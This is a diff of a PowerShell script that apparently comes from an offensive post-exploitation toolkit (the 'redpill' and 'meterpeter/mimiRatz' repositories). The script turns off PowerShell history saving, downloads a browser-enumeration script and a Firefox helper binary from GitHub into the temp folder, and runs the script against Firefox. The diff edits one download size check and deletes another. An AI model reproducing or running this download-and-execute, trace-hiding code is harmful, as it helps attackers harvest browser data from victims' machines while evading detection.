@@ -45,7 +45,7 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
         Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/GetBrowsers.ps1 -Destination $Env:TMP\GetBrowsers.ps1 -ErrorAction SilentlyContinue|Out-Null
         ## Check downloaded file integrity => FileSizeKBytes
         $SizeDump = ((Get-Item -Path "$Env:TMP\GetBrowsers.ps1" -EA SilentlyContinue).length/1KB)
-        If($SizeDump -lt 57){## Corrupted download detected => DefaultFileSize: 57,6708984375/KB
+        If($SizeDump -lt 58){## Corrupted download detected => DefaultFileSize: 58,4423828125/KB
            Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
            If(Test-Path -Path "$Env:TMP\GetBrowsers.ps1"){Remove-Item -Path "$Env:TMP\GetBrowsers.ps1" -Force}
            Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @EnumBrowsers
@@ -79,12 +79,6 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
         If($FFfound -ieq "Installed"){## Firefox Found
             If(-not(Test-Path "$Env:TMP\mozlz4-win32.exe")){## Downloads binary auxiliary 
                 Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/main/bin/meterpeter/mimiRatz/mozlz4-win32.exe -Destination $Env:TMP\mozlz4-win32.exe -ErrorAction SilentlyContinue|Out-Null
-                ## Check downloaded file integrity => FileSizeKBytes
-                $SizeDump = ((Get-Item -Path "$Env:TMP\mozlz4-win32.exe" -EA SilentlyContinue).length/1KB)
-                If($SizeDump -lt 669){## Corrupted download detected => DefaultFileSize: 669,5/KB
-                    Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
-                    If(Test-Path -Path "$Env:TMP\mozlz4-win32.exe"){Remove-Item -Path "$Env:TMP\mozlz4-win32.exe" -Force}
-                }
             }
             ## Execute GetBrowsers -FIREFOX parameter
             &"$Env:TMP\GetBrowsers.ps1" -FIREFOX
